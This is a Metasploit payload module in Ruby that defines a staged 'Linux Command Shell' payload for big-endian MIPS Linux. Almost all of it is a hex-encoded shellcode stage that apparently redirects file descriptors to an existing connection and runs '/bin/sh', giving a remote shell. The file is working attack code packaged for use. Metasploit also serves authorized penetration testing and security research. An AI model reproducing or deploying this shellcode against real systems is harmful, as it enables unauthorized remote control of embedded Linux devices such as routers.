##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell',
      'Description'   => 'Spawn a command shell (staged)',
      'Author'        => 'juan vazquez',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Stage'         =>
        {
          'Payload' =>
            "\x24\x11\xff\xfd\x02\x20\x88\x27\x02\x40\x20\x20\x02\x20" +
            "\x28\x20\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x10\xff\xff" +
            "\x22\x31\xff\xff\x16\x11\xff\xfa\x24\x18\xff\xff\x07\x10" +
            "\xff\xff\x28\x18\xff\xff\x23\xe4\x00\x1c\xaf\xa4\xff\xf8" +
            "\xaf\xa0\xff\xfc\x23\xa5\xff\xf8\x28\x06\xff\xff\x24\x02" +
            "\x0f\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"
        }
      ))
  end

end
